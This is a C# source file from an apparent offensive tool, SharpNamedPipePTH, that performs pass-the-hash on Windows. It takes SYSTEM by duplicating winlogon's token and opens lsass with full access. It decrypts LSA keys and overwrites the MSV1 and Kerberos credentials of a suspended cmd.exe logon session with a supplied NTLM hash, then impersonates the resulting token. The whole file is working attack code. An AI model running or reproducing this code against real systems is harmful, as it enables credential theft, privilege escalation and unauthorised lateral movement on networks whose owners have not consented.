using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using FILETIME = System.Runtime.InteropServices.ComTypes.FILETIME;
using static SharpNamedPipePTH.Win32.Natives;
using SharpNamedPipePTH.Crypto;
using SharpNamedPipePTH.Credential;
using static SharpNamedPipePTH.Kerberos;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;


namespace SharpNamedPipePTH
{
    static class Globals
    {
        private static readonly object lockObject = new object();
        public static IntPtr suspendedProcessHandle;

        public static IntPtr suspendedProcessToken;

        public static int suspendedProcessId;

        public static void UpdateIntPtr(object value)
        {
            lock (lockObject)
            {
                suspendedProcessHandle = (IntPtr)value;
            }
        }

        public static void UpdateIntPtrToken(object value)
        {
            lock (lockObject)
            {
                suspendedProcessToken = (IntPtr)value;
            }
        }
    }


    class PTH
    {

        ////////////////////////////////////////////////////////////////////////////////
        // Impersonates the token from a specified processId
        ////////////////////////////////////////////////////////////////////////////////
        public static bool ImpersonateUser(IntPtr hToken)
        {
            SECURITY_ATTRIBUTES securityAttributes = new SECURITY_ATTRIBUTES();
            IntPtr phNewToken = IntPtr.Zero;
            if (!DuplicateTokenEx(
                        hToken,
                        (uint)ACCESS_MASK.MAXIMUM_ALLOWED,
                        ref securityAttributes,
                        (int)SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                        (int)TOKEN_TYPE.TokenPrimary,
                        ref phNewToken
            ))
            {
                Marshal.GetLastWin32Error();
                return false;
            }
            Console.WriteLine(" [+] Duplicate Token Handle: 0x{0}", phNewToken.ToString("X4"));

            if (!ImpersonateLoggedOnUser(phNewToken))
            {
                Marshal.GetLastWin32Error();
                return false;
            }

            Console.WriteLine("[+] Operating as {0}", WindowsIdentity.GetCurrent().Name);
            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Elevates current process to SYSTEM
        ////////////////////////////////////////////////////////////////////////////////
        public static bool GetSystem()
        {
            Process winlogon = Process.GetProcessesByName("winlogon")[0];
            IntPtr handle = OpenProcess(ProcessAccessFlags.All, true, winlogon.Id);
            if (handle == IntPtr.Zero)
            {
                Console.WriteLine("Failed to open winlogon");
            }

            if (OpenProcessToken(handle, TOKEN_DUPLICATE, out IntPtr hToken))
            {
                Console.WriteLine(" [+] Opened {0}", handle);
                if (ImpersonateUser(hToken))
                    return true;
            }
            else
            {
                Console.WriteLine(" [-] Failed {0}", handle);
            }

            return false;

        }


        public const int AES_128_KEY_LENGTH = 16;
        public const int AES_256_KEY_LENGTH = 32;



        public static int PassTheHash(string user, string domain, IntPtr suspendedProcHandle, string ntlmHash = null, bool impersonate = false)
        {
            if (!Utility.IsElevated())
            {
                Console.WriteLine("Run in High integrity context");
                return 0;
            }

            Utility.SetDebugPrivilege();

            //bool v = GetSystem();
            //string name = WindowsIdentity.GetCurrent().Name;
            //Console.WriteLine($"Running as: {name}.");

            IntPtr lsasrv = IntPtr.Zero;
            IntPtr wdigest = IntPtr.Zero;
            IntPtr lsassmsv1 = IntPtr.Zero;
            IntPtr kerberos = IntPtr.Zero;
            IntPtr tspkg = IntPtr.Zero;
            IntPtr lsasslive = IntPtr.Zero;
            IntPtr hProcess = IntPtr.Zero;
            Process plsass = Process.GetProcessesByName("lsass")[0];

            ProcessModuleCollection processModules = plsass.Modules;
            int modulefound = 0;

            for (int i = 0; i < processModules.Count && modulefound < 5; i++)
            {
                string lower = processModules[i].ModuleName.ToLowerInvariant();

                if (lower.Contains("lsasrv.dll"))
                {
                    lsasrv = processModules[i].BaseAddress;
                    modulefound++;
                }
                else if (lower.Contains("wdigest.dll"))
                {
                    wdigest = processModules[i].BaseAddress;
                    modulefound++;
                }
                else if (lower.Contains("msv1_0.dll"))
                {
                    lsassmsv1 = processModules[i].BaseAddress;
                    modulefound++;
                }
                else if (lower.Contains("kerberos.dll"))
                {
                    kerberos = processModules[i].BaseAddress;
                    modulefound++;
                }
                else if (lower.Contains("tspkg.dll"))
                {
                    tspkg = processModules[i].BaseAddress;
                    modulefound++;
                }
            }

            hProcess = OpenProcess(ProcessAccessFlags.All, false, plsass.Id);

            OSVersionHelper osHelper = new OSVersionHelper();
            osHelper.PrintOSVersion();

            Keys keys = new Keys(hProcess, lsasrv, osHelper);

            
            TOKEN_STATISTICS tokenStats = new TOKEN_STATISTICS();
            string lcommand = string.Empty;
            byte[] aes128bytes = null;
            byte[] aes256bytes = null;
            SEKURLSA_PTH_DATA data = new SEKURLSA_PTH_DATA();
            byte[] ntlmHashbytes = null;
            string lntlmhash = string.Empty;

            if (!string.IsNullOrEmpty(""/*Maybe a variable later on?? Dont know if thats needed*/))
            {
                tokenStats.AuthenticationId.HighPart = 0;
                tokenStats.AuthenticationId.LowPart = uint.Parse("");
                data.LogonId = tokenStats.AuthenticationId;
            }
            else
            {
                if (string.IsNullOrEmpty(user))
                {
                    Console.WriteLine("[x] Missing required parameter user");
                    return 1;
                }

                if (string.IsNullOrEmpty(domain))
                {
                    Console.WriteLine("[x] Missing required parameter domain");
                    return 1;
                }

                if (impersonate)
                    lcommand = System.Reflection.Assembly.GetExecutingAssembly().CodeBase;
                

                Console.WriteLine("[*] user\t: {0}", user);
                Console.WriteLine("[*] domain\t: {0}", domain);
                Console.WriteLine("[*] program\t: {0}", lcommand);
                Console.WriteLine("[*] impers.\t: {0}", impersonate);
            }


            try
            {

                if (!string.IsNullOrEmpty(ntlmHash))
                    ntlmHashbytes = Utility.StringToByteArray(ntlmHash);

                if (ntlmHashbytes.Length != Msv1.LM_NTLM_HASH_LENGTH)
                    throw new System.ArgumentException();

                data.NtlmHash = ntlmHashbytes;

                Console.WriteLine("[*] NTLM\t: {0}", Utility.PrintHashBytes(ntlmHashbytes));
            }
            catch (Exception)
            {
                Console.WriteLine("[x] Invalid Ntlm hash/rc4 key");
                return 1;
            }

            if (data.NtlmHash != null || data.Aes128Key != null || data.Aes256Key != null)
            {
                if (!string.IsNullOrEmpty(""))
                {
                    Console.WriteLine("[*] mode\t: replacing NTLM/RC4 key in a session");
                    Pth_luid(hProcess, lsasrv, kerberos, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), ref data);
                }
                else if (!string.IsNullOrEmpty(user))
                {
                    /*PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
                    Console.WriteLine("[*]  | PID {0}", pi.dwProcessId);
                    Console.WriteLine("[*]  | TID {0}", pi.dwThreadId);
                    */
                    IntPtr hToken = IntPtr.Zero;

                    //hTargetProcess = OpenProcess(ProcessAccessFlags.All, true, 7008);
                    Console.WriteLine(Marshal.GetLastWin32Error());
                    string name = WindowsIdentity.GetCurrent().Name;
                    Console.WriteLine($"Running as: {name}.");

                    
                    SharpNamedPipePTH.Win32.Natives.PROCESS_INFORMATION pInfo = new SharpNamedPipePTH.Win32.Natives.PROCESS_INFORMATION();
                    SharpNamedPipePTH.Win32.Natives.STARTUPINFO sInfo = new SharpNamedPipePTH.Win32.Natives.STARTUPINFO();

                    sInfo.cb = (uint)Marshal.SizeOf(typeof(STARTUPINFO));
                    SharpNamedPipePTH.Win32.Natives.LogonFlags logonFlags = SharpNamedPipePTH.Win32.Natives.LogonFlags.NetCredentialsOnly;
                    
                    

                    if (CreateProcessWithLogonW(user, "", domain, @"C:\Windows\System32\", "cmd.exe", "", CreationFlags.CREATE_SUSPENDED, ref pInfo))
                    {
                        Console.WriteLine($"Executed cmd.exe in Process-ID '{pInfo.dwProcessId}'with impersonated token!");
                        Console.WriteLine($"Process Handle: '{pInfo.hProcess}'");
                    }
                    else
                    {
                        Console.WriteLine("Process Creation failed");
                        Console.WriteLine(Marshal.GetLastWin32Error());
                    }

                    //GetSystem();
                    //Console.WriteLine($"Opening Process by ID : {Globals.suspendedProcessId}.");
                    //Console.WriteLine($"Handle : {suspendedProcHandle}.");

                    GetSystem();
                    //hToken = Globals.suspendedProcessToken;
                    bool test = OpenProcessToken(pInfo.hProcess, TOKEN_READ | (impersonate ? TOKEN_DUPLICATE : 0), out hToken);
                    Console.WriteLine(test);
                    if (hToken != IntPtr.Zero)
                    {
                        Console.WriteLine("[+]  | Process Token {0}", hToken);

                        IntPtr hTokenInformation = Marshal.AllocHGlobal(Marshal.SizeOf(tokenStats));
                        Marshal.StructureToPtr(tokenStats, hTokenInformation, false);

                        uint retlen = 0;

                        if (GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenStatistics, hTokenInformation, (uint)Marshal.SizeOf(tokenStats), out retlen))
                        {
                            Console.WriteLine("[+]  | Get Token Information");
                            tokenStats = (TOKEN_STATISTICS)Marshal.PtrToStructure(hTokenInformation, typeof(TOKEN_STATISTICS));
                            data.LogonId = tokenStats.AuthenticationId;
                            Console.WriteLine("[*] Going to patch LSASS...");
                            Console.WriteLine("Inpt values: {0}, {1}, {2}, {3}, {4}, {5}, {6}", hProcess, lsasrv, kerberos, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey());
                            Pth_luid(hProcess, lsasrv, kerberos, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), ref data);
                            Console.WriteLine("[*] Patching done!");
                            if (data.isReplaceOk)
                            {
                                Console.WriteLine("[+] Replacing of data in the process - check!");
                                if (impersonate)
                                {
                                    SECURITY_ATTRIBUTES at = new SECURITY_ATTRIBUTES();
                                    IntPtr hNewToken = IntPtr.Zero;
                                    if (DuplicateTokenEx(hToken, TOKEN_QUERY | TOKEN_IMPERSONATE, ref at, (int)SECURITY_IMPERSONATION_LEVEL.SecurityDelegation, (int)TOKEN_TYPE.TokenImpersonation, ref hNewToken))
                                    {
                                        /*if (SetThreadToken(ref IntPtr.Zero, hNewToken))
                                            Console.WriteLine("[*] ** Token Impersonation **");
                                        else
                                        {
                                            Console.WriteLine("[x] Error SetThreadToken");
                                            return 1;
                                        }
                                        CloseHandle(hNewToken);*/
                                    }
                                    else
                                    {
                                        Console.WriteLine("[x] Error DuplicateTokenEx");
                                        return 1;
                                    }

                                    NtTerminateProcess(suspendedProcHandle, (uint)NTSTATUS.Success);
                                }
                                else
                                {
                                    
                                    //IntPtr newToken = Globals.suspendedProcessToken;
                                    Console.WriteLine("[*] Setting Thread token as impersonated user...");
                                    // open with all_access
                                    //NtResumeProcess(pInfo.hProcess);
                                    SECURITY_ATTRIBUTES at = new SECURITY_ATTRIBUTES();
                                    IntPtr hNewToken = IntPtr.Zero;
                                    if (DuplicateTokenEx(Globals.suspendedProcessToken, TOKEN_QUERY | TOKEN_IMPERSONATE, ref at, (int)SECURITY_IMPERSONATION_LEVEL.SecurityDelegation, (int)TOKEN_TYPE.TokenImpersonation, ref hNewToken))
                                    {
                                        IntPtr newThread = OpenThread(ThreadAccess.THREAD_ALL_ACCESS, false, (uint)pInfo.dwThreadId);
                                        if (newThread == IntPtr.Zero)
                                        {
                                            Console.WriteLine("OpenThread failed");
                                            return 1;
                                        }
                                        Console.WriteLine("[*] ...");
                                        // As SetThreadtoken required a pHANDLE and OpenThread returns a HANDLE only, we need to generate a new var with is a pointer to the HANDLE
                                        //IntPtr newThreadHandle = ref newThread;
                                        try { 
                                        if (SetThreadToken(ref newThread, hNewToken))
                                        {
                                            Console.WriteLine("Set Thread Token Success");
                                        }
                                        else
                                        {
                                            Console.WriteLine("Set Thread Token failed");
                                        }
                                        }
                                        catch
                                        {
                                            Console.WriteLine("Set Thread Token failed");
                                            Console.WriteLine(Marshal.GetLastWin32Error());
                                        }


                                    }
                                    else
                                    {
                                        Console.WriteLine("[-] DuplicateTokenEx failed");
                                        Console.WriteLine(Marshal.GetLastWin32Error());

                                    }
                                    //NtResumeProcess(pInfo.hProcess);

                                    return 0;//NtResumeProcess(suspendedProcHandle);

                                }
                            }
                            else
                                NtTerminateProcess(suspendedProcHandle, (uint)NTSTATUS.ProcessIsTerminating);

                        }
                        else
                        {
                            Console.WriteLine("[x] Error GetTokenInformazion");
                            return 1;
                        }
                    }
                    else
                    {
                        Console.WriteLine("[x] Error open process");
                        Console.WriteLine(Marshal.GetLastWin32Error());
                        return 1;
                    }
                    
                    //}
                    //else
                    //{
                    //    Console.WriteLine("[x] Error process create");
                    //    return 1;
                    //}
                }
                else
                {
                    Console.WriteLine("[x] Bad user or LUID");
                    return 1;
                }
            }
            else
            {
                Console.WriteLine("[x] Missing at least one argument : ntlm/rc4 OR aes128 OR aes256");
                return 1;
            }

            return 0;
        }

        public static bool CreateProcessWithLogonW(string username, string password, string domain, string path, string binary, string arguments, CreationFlags cf, ref PROCESS_INFORMATION processInformation)
        {

            STARTUPINFO startupInfo = new STARTUPINFO();
            startupInfo.cb = (uint)Marshal.SizeOf(typeof(STARTUPINFO));

            processInformation = new PROCESS_INFORMATION();

            if (!Win32.Natives.CreateProcessWithLogonW(username, domain, password,
                LogonFlags.NetCredentialsOnly, path + binary, path + binary + " " + arguments, cf, 0, path, ref startupInfo, out processInformation))
            {
                return false;
            }

            return true;
        }
        private static void Pth_luid(IntPtr hProcess, IntPtr lsasrvMem, IntPtr kerberos, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, ref SEKURLSA_PTH_DATA data)
        {

            List<Logon> logonlist = new List<Logon>();
            LogonSessions.FindCredentials(hProcess, lsasrvMem, oshelper, iv, aeskey, deskey, logonlist);

            Console.WriteLine("[*]  |  LUID {0} ; {1} ({2:X}:{3:X})", data.LogonId.HighPart, data.LogonId.LowPart, data.LogonId.HighPart, data.LogonId.LowPart);

            Msv1.WriteMsvCredentials(hProcess, oshelper, iv, aeskey, deskey, logonlist, ref data);

            List<KerberosLogonItem> klogonlist = Kerberos.FindCredentials(hProcess, kerberos, oshelper, iv, aeskey, deskey, logonlist);

            foreach (KerberosLogonItem s in klogonlist)
            {
                Kerberos.WriteKerberosKeys(ref hProcess, s, oshelper, iv, aeskey, deskey, ref data);
            }

            Console.WriteLine("[*]");
        }

 


        public class SEKURLSA_PTH_DATA
        {
            public LUID LogonId { get; set; }
            public byte[] NtlmHash { get; set; }
            public byte[] Aes256Key { get; set; }
            public byte[] Aes128Key { get; set; }
            public bool isReplaceOk;
        }

    }
 
}
